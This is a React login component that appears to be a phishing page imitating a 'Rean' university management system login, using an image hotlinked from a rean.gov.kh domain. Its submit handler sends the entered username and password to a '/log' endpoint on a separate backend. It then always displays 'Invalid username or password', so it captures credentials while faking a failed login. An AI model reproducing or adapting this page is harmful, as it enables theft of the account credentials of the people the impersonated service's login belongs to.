import React, { useState } from "react";
import "bootstrap/dist/css/bootstrap.min.css"; // Ensure Bootstrap is loaded
// import "./login.css";

const BACKEND = import.meta.env?.VITE_BACKEND_URL || "http://localhost:5000";

export default function Login() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [msg, setMsg] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      await fetch(`${BACKEND}/log`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });
      setMsg("Invalid username or password");
      setPassword("");
    } catch (err) {
      setMsg("Network error");
      console.error(err);
    }
  };

  return (
    <div className="container-fluid vh-100">
      <div className="row h-100">
        {/* Left side */}
        <div className="col-lg-6 d-flex flex-column justify-content-center align-items-center bg-light">
          <div className="text-center p-4">
            <h2>University Management System</h2>
            <p>
              "Prioritize user experience by creating an intuitive interface that is easy to navigate, ensuring quick and hassle-free access to the system"
            </p>
            <p className="mt-4">Prepared by</p>
          </div>
          {/* Left image */}
          <div className="left-back-img">
            <img
              src="https://test.rean.gov.kh/v2/8e1bc2a1925d0cfa8a4fad5a8ecdd278.jpg"
              alt="Left side"
              className="img-fluid"
            />
          </div>
        </div>

        {/* Right side */}
        <div className="col-lg-6 d-flex flex-column justify-content-center align-items-center">
          <div className="w-75">
            <h3 className="mb-3">Login to Rean</h3>
            <form onSubmit={handleSubmit}>
              <div className="mb-3">
                <label className="form-label">Username</label>
                <input
                  type="text"
                  className="form-control"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  required
                />
              </div>
              <div className="mb-3">
                <label className="form-label">Password</label>
                <input
                  type="password"
                  className="form-control"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                />
              </div>
              {msg && <p className="text-danger">{msg}</p>}
              <button type="submit" className="btn btn-primary w-100">
                Login
              </button>
            </form>
            <p className="mt-3 text-center">
              <a href="#">Forgot password?</a>
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
